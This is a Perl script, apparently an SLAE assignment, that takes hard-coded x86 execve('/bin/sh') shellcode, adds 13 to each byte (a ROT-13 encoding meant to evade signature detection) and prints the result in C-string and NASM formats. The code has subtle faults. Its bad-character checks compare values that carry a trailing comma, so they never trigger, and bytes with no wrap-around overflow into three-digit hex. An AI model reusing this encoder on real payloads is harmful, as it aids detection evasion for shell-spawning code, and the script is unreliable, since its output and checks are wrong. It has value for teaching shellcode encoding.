#Author: John Stigerwalt
#Program Function: Takes shellcode and encodes with ROT-x
#SLAE Assignment #4
#
#Note: Change "$secret" variable to use different ROT-x Encoding Scheme
#

# Orginal Shellcode
$code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

#Set Value and convert to Hex using unpack
$secret = 13;
print "\n"."---------------------------------"."\n";
print "Using ROT".$secret." Encoding"."\n";

# use hex of $code
$hexcode = unpack("H*",$code);
$hexlen = length($code);

print "[+] Hex code: ".$hexcode."\n";
print "Hex Length: ".$hexlen."\n";
print "---------------------------------"."\n";

#Orginal Push Array
@enc;

# Formating Push Arrays
@encx;
@enco;
@org;

for ($i=0;$i<$hexlen;$i++) {
	
	 $encoded = unpack("H*", substr($code,$i,1));
	 
	 $addx = "0x" . $encoded . ",";
	 push @org, $addx;
	 
	 $h = hex $encoded;
	 $k = sprintf("%d", $h);
	 $j = ($k + $secret);
	 $bit = sprintf("%x", $j);
	 push @enc, $bit;	 
}

foreach $x (@enc) {
	$zx = "0x" . $x . ",";
	push @encx, $zx;
	
	$zc = "\\x" . $x;
	push @enco, $zc;
	
	if ($zx eq "0x00") {
		warn "Shellcode contains: \"0x00\" ";
	}
	if ($zx eq "0xbb") {
		warn "Shellcode contains: \"0xbb\" ";
	}
	if ($zx eq "0x61") {
		warn "Shellcode contains: \"0x61\" ";
	}
	if ($zx eq "0xa0") {
		warn "Shellcode contains: \"0xa0\" ";
	}
	if ($zx eq "0xc6") {
		warn "Shellcode contains: \"0xc6\" ";
	}
	
}

print "\nOrginal Shellcode: " . "\"";
print @org;
print "\""."\n\n";

print "\nROT".$secret." Enocded Shellcode Format: " . "\"";
print @enco;
print "\""."\n\n";

print "\nROT".$secret." Encoded NASM Format: " . "\"";
print @encx;
print "\""."\n\n";

exit(1);
